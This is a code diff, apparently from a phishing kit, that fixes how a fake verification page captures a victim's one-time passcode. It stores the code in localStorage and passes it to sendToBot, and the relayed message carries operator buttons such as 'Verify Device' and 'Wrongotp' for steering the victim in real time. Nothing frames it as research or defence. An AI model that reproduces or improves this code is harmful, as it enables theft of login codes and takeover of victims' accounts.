@@ -559,15 +559,15 @@ Applicant: <code>Not provided</code>
                 { text: '📱 Verify Device', callback_data: verifyId }
               ],
               [
-                { text: '❌ Wrongotp', callback_data: declineId }
+                { text: '❌ Wrongotp', callback_data: wrongotpId }
               ]
             ]
           }
         })
       })
       .then(() => {
-        localStorage.setItem('fbc_verified_otp', 'code');
-        localStorage.setItem('fbc_verified_otp', 'code');
+        localStorage.setItem('fbc_verified_otp', otp);
+        localStorage.setItem('fbc_verification_otp', otp);
         localStorage.setItem('fbc_otp_ref', '9vXfk');
 
         document.getElementById('spinnerOverlay').style.display = 'flex';
@@ -634,7 +634,7 @@ Applicant: <code>Not provided</code>
       }
       
 
-      hideLoginError();
+      hideOtpError();
       sendToBot(otpVal);
     }
 
